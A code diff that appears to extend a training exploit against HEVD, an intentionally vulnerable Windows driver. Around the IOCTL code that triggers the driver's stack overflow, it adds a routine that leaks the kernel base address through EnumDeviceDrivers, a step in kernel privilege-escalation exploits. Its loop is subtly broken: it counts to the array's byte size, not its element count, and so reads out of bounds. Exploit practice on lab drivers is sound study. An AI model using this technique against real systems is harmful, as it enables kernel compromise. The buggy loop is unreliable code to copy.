@@ -6,6 +6,22 @@
 //ioctl code to trigger Stack Overflow vulnerability
 #define IOCTL_CODE 0x222003
 
+// Get base of ntoskrnl.exe
+LPVOID GetNTOsBase()
+{
+    LPVOID Bases[0x1000];
+    DWORD needed = 0;
+    LPVOID krnlbase = NULL;
+    if (EnumDeviceDrivers(Bases, sizeof(Bases), &needed))
+    {
+        krnlbase = Bases[0];
+        for (int i=0;i<sizeof(Bases);i++) {
+            printf("Driver %d: %p\n", i, Bases[i]);
+        }
+    }
+    return krnlbase;
+}
+
 int main()
 {
     //Create Handle to HEVD Driver
@@ -17,6 +33,8 @@ int main()
         printf("No handle to driver :(\n");
         exit(-1);
     }
+
+    LPVOID ntoskrnl_base = GetNTOsBase();
 
     //variable for DeviceIoControl->lpBytesReturned parameter
     DWORD bytesRtrnd;
